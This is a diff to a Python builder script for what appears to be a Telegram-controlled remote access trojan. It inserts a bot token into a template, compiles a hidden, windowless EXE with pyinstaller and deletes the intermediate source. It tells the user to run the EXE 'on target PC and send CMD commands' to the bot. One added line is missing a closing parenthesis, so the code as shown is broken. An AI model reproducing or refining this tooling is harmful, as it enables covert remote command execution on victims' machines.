@@ -6,12 +6,14 @@ if icon == 'D' or icon == '':
     icon = "bot.ico"
 else:
   icon = icon
-with open('bot.py', 'w+') as file:
+with open('blank.py') as file:
     new_content = file.read().replace('<token>', token)
-    file.write(new_content)
+with open('bot.py', 'w') as file:
+    file.write(new_content
 print('Building EXE file...')
 try:
     assert os.system(f'pyinstaller --icon {icon} -w --onefile bot.py') == 0
+    os.remove('bot.py')
     os.rename('dist/bot.exe', 'bot.exe')
     print('Run bot.exe on target PC and send CMD commands to your telegram bot!')
 except:
